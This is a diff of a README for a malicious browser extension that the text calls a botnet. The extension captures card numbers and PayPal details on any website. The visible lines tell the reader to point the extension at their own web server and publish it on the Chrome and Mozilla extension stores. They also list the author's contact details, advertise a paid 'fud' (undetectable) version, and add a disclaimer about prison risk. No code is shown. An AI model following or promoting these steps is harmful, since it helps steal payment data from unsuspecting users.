@@ -19,9 +19,6 @@ botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,f
 
 
 
-# demo video Youtub (update video )
-https://youtu.be/ljZsw3bRxPY
-
 # what do you need ? 
 
 -web server for exemple hosgator, or free hosting (00webhost ) or wampserver or xhampp ... to test your extension
@@ -39,7 +36,10 @@ change http://1127.0.0.1     to your web server
 
 4) publish your extension one chrome web store or adon mozilla
 
-# waring !!!!!!!
+waring !!!!!!!
 # whatsapp, Email,ICQ :  +1 315 636 6596 (fake whatsapp ) , hakanonymos@hotmail.com #ICQ : hakanonymos 
 this is older version of javascript but new version php,if you need a fud version contact me
-# I am in no way responsible for your actions, you risk going to prison
+ I am in no way responsible for your actions, you risk going to prison
+ 
+# demo video Youtub (update video )
+https://youtu.be/ljZsw3bRxPY
